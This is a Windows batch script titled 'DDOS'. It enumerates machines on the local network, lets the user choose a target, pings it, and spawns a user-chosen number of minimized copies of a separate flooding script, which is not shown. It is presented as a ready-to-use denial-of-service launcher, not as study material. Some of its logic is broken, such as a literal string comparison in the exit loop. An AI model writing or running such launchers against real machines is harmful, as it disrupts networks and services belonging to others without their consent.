@echo off
title DDOS
echo ___________________________
echo Program by Mohid "Meenit" Saeed and Dexter "dnighthawk" Gard
echo ___________________________
echo Loading computers...
net view
set INPUT=
set /P INPUT="Choose a computer. >"
set /P OPENNUM="Put in the number of apps. >"
cls
echo Scanning address for authenticity
echo %INPUT% > COMPID.txt
ping %INPUT% > nul
IF ERRORLEVEL 1 (
color 4F
echo It appears that that IP is invalid.
echo Press any key to exit.
pause > nul
exit
)
cls
echo IP is valid. Loading subscripts... [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
for /L %%a in (1,1,%OPENNUM%) do (
Start /min DDOSSCRIPT.bat
)
cls
IF ERRORLEVEL 1 (
color 40
echo ERROR
echo Press any key to exit
pause > nul
exit
)
pause
cls
Color 2F
echo %OPENNUM% subscripts sucessfully created! [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
:finalloop
echo Press any key to exit out of this and all subscripts.
pause >nul
set /P INPUT="Are you sure? Y/N >"
if INPUT == N goto :finalloop
taskkill /IM cmd.exe /FI "WINDOWTITLE eq SUBSCRIPT*" > null
goto end 
:end